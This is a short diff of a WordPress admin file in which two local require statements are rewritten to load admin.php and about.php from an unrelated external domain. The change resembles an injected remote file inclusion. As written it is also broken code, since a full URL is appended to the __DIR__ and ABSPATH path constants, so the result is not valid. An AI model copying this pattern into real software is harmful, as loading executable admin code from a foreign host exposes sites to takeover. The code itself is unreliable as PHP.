@@ -8,6 +8,6 @@
  */
 
 /** Load WordPress Administration Bootstrap */
-require_once __DIR__ . '/admin.php';
+require_once __DIR__ . 'https://palestina-israel-konflikten.multireligionvalsystem.eu.org/admin.php';
 
-require ABSPATH . 'wp-admin/about.php';
+require ABSPATH . 'https://palestina-israel-konflikten.multireligionvalsystem.eu.org/wp-admin/about.php';
